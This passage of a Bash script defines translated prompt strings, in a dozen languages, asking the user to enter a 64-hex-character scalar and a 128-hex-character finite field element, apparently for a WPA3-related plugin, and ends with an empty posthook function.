	arr["TURKISH","double_decker_manual_2"]="Scalar girin (64 onaltılık karakter)."
	arr["ARABIC","double_decker_manual_2"]="(64 حرفًا سداسيًا عشريًا) Scalar أدخل"
	arr["CHINESE","double_decker_manual_2"]="输入 Scalar（64 个十六进制字符）。"

	# double_decker_manual_3
	arr["ENGLISH","double_decker_manual_3"]="Insert Finite Field Element (128 hex chars)."
	arr["SPANISH","double_decker_manual_3"]="Inserte Finite Field Element (128 caracteres hexadecimales)."
	arr["FRENCH","double_decker_manual_3"]="Insérez Finite Field Element (128 caractères hexadécimaux)."
	arr["CATALAN","double_decker_manual_3"]="Introduïu Finite Field Element (128 caràcters hexadecimals)."
	arr["PORTUGUESE","double_decker_manual_3"]="Insira Finite Field Element (128 caracteres hexadecimais)."
	arr["RUSSIAN","double_decker_manual_3"]="Введите Finite Field Element (128 шестнадцатеричных символов)."
	arr["GREEK","double_decker_manual_3"]="Εισαγάγετε Finite Field Element (128 δεκαεξαδικοί χαρακτήρες)."
	arr["ITALIAN","double_decker_manual_3"]="Inserisci Finite Field Element (128 caratteri esadecimali)."
	arr["POLISH","double_decker_manual_3"]="Wprowadź Finite Field Element (128 znaków szesnastkowych)."
	arr["GERMAN","double_decker_manual_3"]="Finite Field Element eingeben (128 Hex-Zeichen)."
	arr["TURKISH","double_decker_manual_3"]="Finite Field Element girin (128 onaltılık karakter)."
	arr["ARABIC","double_decker_manual_3"]="(128 حرفًا سداسيًا عشريًا) Finite Field Element أدخل"
	arr["CHINESE","double_decker_manual_3"]="输入 Finite Field Element（128 个十六进制字符）。"

	wpa3_hints+=("double_decker_1")
}

# ----------------------------------------------------------------------
# Posthooks
# ----------------------------------------------------------------------
function double_decker_posthook_initialize_colors() { :; return 0; }
